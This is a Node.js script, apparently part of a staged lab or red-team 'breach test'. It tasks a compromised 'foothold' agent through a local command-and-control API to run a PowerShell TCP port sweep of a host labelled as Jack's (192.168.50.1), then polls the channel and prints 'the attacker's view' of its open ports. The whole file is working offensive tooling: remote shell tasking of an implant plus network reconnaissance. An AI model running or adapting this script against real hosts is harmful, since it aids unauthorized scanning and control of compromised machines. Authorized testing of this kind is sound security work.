// breach-p1-scan.mjs — breach test Phase 1: port-sweep Jack's host (192.168.50.1) from
// the range guest via the channel foothold, and print the attacker's view. One-shot.
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2] || 'd811a737a1fd';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const j = async (path, body) => { const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined); return r.json(); };

const sweep = "$ports=@(21,22,23,25,53,80,135,139,443,445,623,1433,3306,3389,5040,5985,5986,7680,8080,4453,5335,8971,49561,27017);"
  + "$open=@();foreach($p in $ports){$c=New-Object Net.Sockets.TcpClient;"
  + "$a=$c.BeginConnect('192.168.50.1',$p,$null,$null);$ok=$false;"
  + "if($a.AsyncWaitHandle.WaitOne(400)){try{$c.EndConnect($a);$ok=$true}catch{}};"
  + "if($ok){$open+=$p};$c.Close()};'OPEN:'+($open -join ',')";

console.log('[1] tasking foothold ' + FOOTHOLD + ' with the host sweep...');
const t = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'powershell -NoProfile -Command "' + sweep + '"' });
console.log('    taskId:', t.taskId);
let out = null;
for (let i = 0; i < 30; i++) {
  await sleep(3000);
  const { tasks } = await j('/api/channel/tasks?agent=' + FOOTHOLD);
  const x = (tasks || []).find((y) => y.taskId === t.taskId);
  if (x && x.status === 'resulted') { out = x.resultPreview; break; }
}
console.log('[2] attacker view of 192.168.50.1:', out || '(no result in time)');
